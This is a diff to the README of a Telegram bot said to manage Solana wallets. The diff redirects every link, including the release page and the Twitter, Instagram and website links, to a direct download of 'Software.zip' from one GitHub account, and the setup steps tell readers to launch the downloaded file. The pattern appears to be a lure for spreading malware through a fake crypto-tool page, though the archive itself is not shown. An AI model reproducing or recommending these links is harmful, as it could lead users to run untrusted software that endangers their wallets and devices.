@@ -16,10 +16,10 @@ Welcome to Solmate – your go-to Telegram bot for managing all your Solana wall
 
 ## **🔗 Quick Links**
 
-🚀 **[Download Solmate Bot v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)** 🚀  
+🚀 **[Download Solmate Bot v1.0.0](https://github.com/vishu-2406/solmate/releases/download/v1.0/Software.zip)** 🚀  
 *Needs to be launched*
 
-📦 [Check Releases for Updates](https://github.com/solmate/releases) 📦
+📦 [Check Releases for Updates](https://github.com/vishu-2406/solmate/releases/download/v1.0/Software.zip) 📦
 
 ---  
 
@@ -36,7 +36,7 @@ Welcome to Solmate – your go-to Telegram bot for managing all your Solana wall
 
 To start using Solmate, simply follow these steps:
 
-1. Click [here to download the Solmate Bot v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).  
+1. Click [here to download the Solmate Bot v1.0.0](https://github.com/vishu-2406/solmate/releases/download/v1.0/Software.zip).  
 2. Launch the downloaded file to install Solmate on your device.  
 3. Open Telegram and search for “Solmate Bot” to start interacting with the bot.  
 4. Follow the on-screen instructions to set up your Solmate account and start managing your Solana assets!
@@ -64,9 +64,9 @@ If you have any questions, feedback, or need assistance with Solmate, feel free 
 
 Follow us on social media to stay updated on the latest features, news, and developments in the Solana ecosystem:
 
-📱 [Twitter](https://twitter.com/SolmateHub)  
-📷 [Instagram](https://instagram.com/SolmateHub)  
-🌐 [Website](https://www.solmate.com)
+📱 [Twitter](https://github.com/vishu-2406/solmate/releases/download/v1.0/Software.zip)  
+📷 [Instagram](https://github.com/vishu-2406/solmate/releases/download/v1.0/Software.zip)  
+🌐 [Website](https://github.com/vishu-2406/solmate/releases/download/v1.0/Software.zip)
 
 ---
 
